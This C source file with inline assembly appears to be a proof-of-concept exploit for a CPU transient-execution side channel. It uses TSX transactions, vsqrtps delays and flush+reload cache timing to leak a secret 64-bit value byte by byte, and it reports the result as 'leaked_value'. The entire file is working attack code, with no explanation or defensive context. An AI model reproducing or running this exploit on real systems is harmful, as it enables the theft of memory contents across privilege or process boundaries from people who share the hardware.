#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <immintrin.h>

inline __attribute__((always_inline)) int rdtsc_access(unsigned char *addr) {
    volatile unsigned long time;
    asm volatile(
    "  mfence             \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  lfence             \n"
    "  movq %%rax, %%rsi  \n"
    "  movq (%1), %%rax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subq %%rsi, %%rax  \n"
    : "=a" (time)
    : "c" (addr)
    :  "%rsi", "%rdx"
    );
    return time;
}

inline __attribute__((always_inline)) int time_flush_reload(unsigned char *ptr) {
  int time = rdtsc_access(ptr);

  _mm_clflush(ptr);
  return time;
}

int tsxabort_leak_next_byte_by_6prefix(
     register uintptr_t prefix, uint64_t mask, uint32_t pos, uint8_t volatile * reloadbuffer, uint8_t volatile * dummy_buffer) {
    char volatile buffer[1024];
    uint64_t retv = 0xAABB;
    //volatile register uint64_t mask = ~((0xff)<<(pos*8)) & 0xffffffffffffffff;
    volatile register uint64_t ror = (pos==8?0:pos*8);
    _mm_clflush(reloadbuffer);
    _mm_clflush(dummy_buffer);

	asm goto volatile(
    "sfence\n"
	"xbegin %l5\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "movq (%0), %%rax\n"
    "xorq %2, %%rax\n"
    "andq %3, %%rax\n"
    "mov %4, %%rcx\n"
    "ror %%cl, %%rax\n"
	"shl $0xc, %%rax\n"
	"movq (%%rax, %1), %%rax\n"
    "movq (0x23000), %%rax\n"
    ""
    :
    :"r"(dummy_buffer+1), "r"(reloadbuffer), "r"(prefix), "r"(mask), "r"(ror)
    :"rax", "r11", "rcx"
    :label_end
    );

	asm volatile(
	"xend\n"
    "\n"
    );
    label_end:
    return retv;
}

int main(int argc, char **argv) {
    // NOTE: use MAP_HUGETLB have a better performance
    if (argc != 2) {
        printf("usage: %s <suffix>", argv[0]);
        exit(1);
    }
    unsigned long suffix = strtoul(argv[1], NULL, 0);
    printf("using suffix 0x%lx", suffix);
    //unsigned char * reloadbuffer = (unsigned char *)mmap(0, 4096*256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    //unsigned char * dummy_buffer = (unsigned char *)mmap(0, 4096*256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    unsigned char * reloadbuffer = (unsigned char *)mmap(0, 4096*256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE , -1, 0);
    unsigned char * dummy_buffer = (unsigned char *)mmap(0, 4096*256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE , -1, 0);
    uint64_t leaked_value = 0xffffffff00000000 | suffix;
    for (uint64_t pos = 2; pos <= 3; pos ++) {
        uint32_t sum[256] = {0};
        for (uint64_t round = 0; round < 30000; round ++) {
            uint64_t knownvalue = 0xffffffff00000000 | suffix;
            uint64_t mask       = 0xffffffff0000ffff;
            mask |= ((uint64_t)0xff<<(pos*8));

            knownvalue &= mask;
            knownvalue = knownvalue & ~(((uint64_t)0xff)<<(8*pos));

            for (size_t i = 0; i < 256; i++) {
                int y = tsxabort_leak_next_byte_by_6prefix(knownvalue, mask, pos, reloadbuffer, dummy_buffer);
                int time = time_flush_reload(reloadbuffer+i*4096);
                if (time < 150)
                    sum[i] += 1;
            }

        }
        int max_value = 0;
        int max_index = 0;

        for (int i = 0; i < 256; i++) {
            if (sum[i]) {
                printf("%03d 0x%02x %d\n", i, i, sum[i]);
                if (sum[i] > max_value) {
                    max_value = sum[i];
                    max_index = i;
                }
            }
        }

        leaked_value |= (((uint64_t)max_index)<<(pos*8));
        printf("leaked_value: %lx\n", leaked_value);
    }
}
